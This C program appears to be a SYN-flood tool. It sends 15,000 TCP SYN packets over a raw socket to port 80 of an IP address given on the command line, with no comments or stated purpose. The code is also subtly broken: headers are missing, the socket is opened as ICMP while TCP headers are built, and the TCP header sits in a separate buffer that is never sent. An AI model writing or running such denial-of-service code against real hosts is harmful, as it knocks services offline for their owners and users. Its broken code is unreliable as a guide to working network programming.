#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in addr;
    int i;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <ip address>\n", argv[0]);
        exit(1);
    }

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_aton(argv[1], &addr.sin_addr);

    for (i = 0; i < 15000; i++) {
        struct iphdr *iphdr = (struct iphdr *)malloc(sizeof(struct iphdr));
        struct tcphdr *tcphdr = (struct tcphdr *)malloc(sizeof(struct tcphdr));
        iphdr->ihl = 5;
        iphdr->version = 4;
        iphdr->tos = 0;
        iphdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iphdr->id = htons(12345);
        iphdr->frag_off = 0;
        iphdr->ttl = 64;
        iphdr->protocol = IPPROTO_TCP;
        iphdr->saddr = INADDR_ANY;
        iphdr->daddr = addr.sin_addr.s_addr;
        tcphdr->source = htons(12345);
        tcphdr->dest = htons(80);
        tcphdr->seq = htonl(i);
        tcphdr->ack_seq = 0;
        tcphdr->doff = 5;
        tcphdr->syn = 1;
        tcphdr->window = htons(65535);
        tcphdr->urg_ptr = 0;
        sendto(sockfd, iphdr, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
    }

    close(sockfd);
    return 0;
}
